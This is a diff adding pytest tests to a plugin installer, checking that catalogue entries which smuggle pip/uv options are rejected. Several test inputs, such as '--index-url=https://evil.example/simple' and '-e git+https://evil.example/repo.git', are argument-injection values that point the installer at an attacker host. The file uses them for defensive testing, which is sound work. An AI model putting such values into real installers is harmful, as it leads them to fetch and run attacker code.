@@ -17,6 +17,7 @@ import pytest
 
 from glider.plugins.installer import (
     InstallResult,
+    MalformedEntryError,
     NoInstallerError,
     _default_runner,
     incompatibility_message,
@@ -461,3 +462,112 @@ def test_the_bundled_harp_entry_declares_its_prerelease_requirement():
 
     entry = next(p for p in PluginRegistry.load_bundled().plugins if p["name"] == "glider-harp")
     assert any(r.startswith("harp-protocol>=0.5.0rc1") for r in entry["requirements"])
+
+
+# --- argv injection through catalogue tokens ---------------------------------
+#
+# `installer_command` splices `package` and the catalogue `requirements`
+# straight into pip/uv argv, so any token starting with `-` becomes an
+# installer OPTION, not a package: a poisoned index entry (or the
+# user-writable plugin_index.json cache, trusted at the same level) turns the
+# Install button into arbitrary pip flags -- `--index-url`, `-e git+...`.
+# Rejected at `installer_command` level so both the pip and uv shapes are
+# covered, and surfaced through `install()` as a failure on the row.
+
+
+def test_a_leading_dash_package_is_refused():
+    with pytest.raises(MalformedEntryError, match=r"--index-url"):
+        installer_command(
+            "--index-url=https://evil.example/simple",
+            pip_available=lambda: True,
+            uv_path=lambda: None,
+        )
+
+
+def test_a_leading_dash_requirement_is_refused():
+    with pytest.raises(MalformedEntryError, match=r"--pre"):
+        installer_command(
+            "glider-harp",
+            requirements=("--pre",),
+            pip_available=lambda: True,
+            uv_path=lambda: None,
+        )
+
+
+def test_an_editable_vcs_requirement_is_refused():
+    with pytest.raises(MalformedEntryError, match=r"-e git"):
+        installer_command(
+            "glider-harp",
+            requirements=("-e git+https://evil.example/repo.git",),
+            pip_available=lambda: True,
+            uv_path=lambda: None,
+        )
+
+
+def test_a_requirement_that_is_not_pep_508_shaped_is_refused():
+    with pytest.raises(MalformedEntryError, match="malformed"):
+        installer_command(
+            "glider-harp",
+            requirements=("git+https://evil.example/repo.git",),
+            pip_available=lambda: True,
+            uv_path=lambda: None,
+        )
+
+
+def test_the_uv_shape_is_guarded_too():
+    with pytest.raises(MalformedEntryError):
+        installer_command(
+            "--index-url=https://evil.example/simple",
+            pip_available=lambda: False,
+            uv_path=lambda: "uv",
+        )
+
+
+def test_the_refusal_names_the_token_and_blames_the_catalogue():
+    with pytest.raises(MalformedEntryError) as excinfo:
+        installer_command(
+            "glider-harp",
+            requirements=("--pre",),
+            pip_available=lambda: True,
+            uv_path=lambda: None,
+        )
+
+    assert "'--pre'" in str(excinfo.value)
+    assert "catalogue entry is malformed" in str(excinfo.value)
+
+
+async def test_a_poisoned_requirement_reaches_install_as_a_refusal_not_a_crash():
+    ran = False
+
+    async def run(args, on_output=None):
+        nonlocal ran
+        ran = True
+        return 0, ""
+
+    result = await install(
+        {**ENTRY, "requirements": ["-e git+https://evil.example/repo.git"]},
+        glider_version="1.0.0",
+        runner=run,
+    )
+
+    assert result.ok is False
+    assert "-e git+https://evil.example/repo.git" in result.message
+    assert ran is False
+
+
+def test_a_plain_valid_case_builds_the_exact_argv_it_always_did():
+    cmd = installer_command(
+        "glider-harp",
+        requirements=("harp-protocol>=0.5.0rc1,<0.6",),
+        pip_available=lambda: True,
+        uv_path=lambda: None,
+    )
+
+    assert cmd == [
+        sys.executable,
+        "-m",
+        "pip",
+        "install",
+        "glider-harp",
+        "harp-protocol>=0.5.0rc1,<0.6",
+    ]
